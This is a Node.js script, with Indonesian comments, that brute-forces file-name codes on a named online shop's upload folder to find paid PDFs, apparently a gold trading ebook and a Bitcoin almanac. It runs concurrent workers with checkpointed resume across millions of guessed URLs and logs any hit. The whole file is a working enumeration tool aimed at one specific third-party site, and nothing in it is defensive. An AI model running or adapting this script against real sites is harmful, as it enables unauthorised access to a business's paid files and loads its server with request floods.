const axios = require('axios');
const fs = require('fs');

// const baseUrl = "https://graphiql.astronaccishop.com/uploads/pdf/bitcoin_almanac_2026_";

const baseUrl = "https://graphiql.astronaccishop.com/uploads/pdf/the_70_pips_gold_trading_system_";

/*
Default checkpoint

{
  "up": {
    "0": 99999,
    "1": 89999,
    "2": 79999,
    "3": 69999,
    "4": 59999,
    "5": 49999,
    "6": 39999,
    "7": 29999,
    "8": 19999,
    "9": 9999
  }
}

*/

const foundLog = 'found.log';
const checkpointFile = 'checkpoint.json';

const MAX_CONCURRENT = 5;
const MAX_WORKERS = 10;

const chars = 'abcdefghijklmnopqrstuvwxyz';

let shouldStop = false;

// ================= CHECKPOINT =================
function loadCheckpoint() {
    try {
        if (!fs.existsSync(checkpointFile)) return {};

        const data = fs.readFileSync(checkpointFile, 'utf-8').trim();
        if (!data) return {};

        return JSON.parse(data);
    } catch (err) {
        console.log("⚠️ Checkpoint rusak, reset...");
        return {};
    }
}

function saveCheckpoint(data) {
    const temp = checkpointFile + '.tmp';
    fs.writeFileSync(temp, JSON.stringify(data, null, 2));
    fs.renameSync(temp, checkpointFile);
}

// ================= REQUEST =================
async function checkFile(code) {
    if (shouldStop) return;

    const url = `${baseUrl}${code}.pdf`;

    try {
        const res = await axios.get(url, {
            timeout: 5000,
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Range': 'bytes=0-10'
            }
        });

        if (res.status >= 200 && res.status < 300) {
            const msg = `[FOUND] ${new Date().toISOString()} -> ${url}\n`;
            console.log('\x1b[32m%s\x1b[0m', msg.trim());
            fs.appendFileSync(foundLog, msg);

            shouldStop = true;
        }
    } catch (err) {
    }
}

// ================= WORKER =================
async function worker(prefix, start, end, workerId, checkpoint) {
    let tasks = [];

    if (!checkpoint[prefix]) checkpoint[prefix] = {};

    let current = checkpoint[prefix][workerId] || start;

    console.log(`🚀 [${prefix}] Worker ${workerId}: ${current} → ${end}`);

    for (let num = current; num >= end; num--) {
        if (shouldStop) break;

        const code = `${prefix}${num}`;
        tasks.push(checkFile(code));

        checkpoint[prefix][workerId] = num;

        if (tasks.length >= MAX_CONCURRENT) {
            await Promise.all(tasks);
            tasks = [];
            saveCheckpoint(checkpoint);
        }
    }

    if (tasks.length > 0) {
        await Promise.all(tasks);
    }

    delete checkpoint[prefix][workerId];

    if (Object.keys(checkpoint[prefix]).length === 0) {
        delete checkpoint[prefix];
    }

    saveCheckpoint(checkpoint);

    console.log(`✅ [${prefix}] Worker ${workerId} selesai`);
}

// ================= RANGE =================
function generateRanges() {
    return [
        { start: 99999, end: 90000 },
        { start: 89999, end: 80000 },
        { start: 79999, end: 70000 },
        { start: 69999, end: 60000 },
        { start: 59999, end: 50000 },
        { start: 49999, end: 40000 },
        { start: 39999, end: 30000 },
        { start: 29999, end: 20000 },
        { start: 19999, end: 10000 },
        { start: 9999, end: 1 }
    ];
}

// ================= PREFIX =================
function generatePrefixes() {
    const list = [];
    for (let a of chars) {
        for (let b of chars) {
            list.push(a + b);
        }
    }
    return list;
}

// ================= MAIN =================
async function run() {
    console.log("🔥 Multi Prefix + Smart Resume\n");

    const allPrefixes = generatePrefixes();
    const checkpoint = loadCheckpoint();
    const ranges = generateRanges();

    console.log("📂 Loaded checkpoint:", checkpoint);

    // ================= SMART RESUME =================
    let prefixes;

    if (Object.keys(checkpoint).length > 0) {
        // Cari prefix terkecil (alphabetically) dari checkpoint
        const startPrefix = Object.keys(checkpoint).sort()[0];
        const startIndex = allPrefixes.indexOf(startPrefix);

        if (startIndex !== -1) {
            prefixes = allPrefixes.slice(startIndex);
        } else {
            prefixes = allPrefixes;
        }
        console.log("♻️ Resume dari prefix:", startPrefix, "(lanjut sampai zz)");
    } else {
        prefixes = allPrefixes;
        console.log("🆕 Mulai dari awal (aa → zz)");
    }

    // ================= LOOP PREFIX =================
    for (const prefix of prefixes) {
        if (shouldStop) break;

        console.log(`\n🔎 PREFIX: ${prefix}`);

        let activeWorkers = [];

        for (let i = 0; i < ranges.length; i++) {
            const { start, end } = ranges[i];
            const workerId = i;

            activeWorkers.push(worker(prefix, start, end, workerId, checkpoint));

            if (activeWorkers.length >= MAX_WORKERS) {
                await Promise.all(activeWorkers);
                activeWorkers = [];
            }
        }

        if (activeWorkers.length > 0) {
            await Promise.all(activeWorkers);
        }
    }

    if (shouldStop) {
        console.log("\n🛑 Dihentikan karena ditemukan!");
    } else {
        console.log("\n✅ Selesai semua scan");
    }
}

run();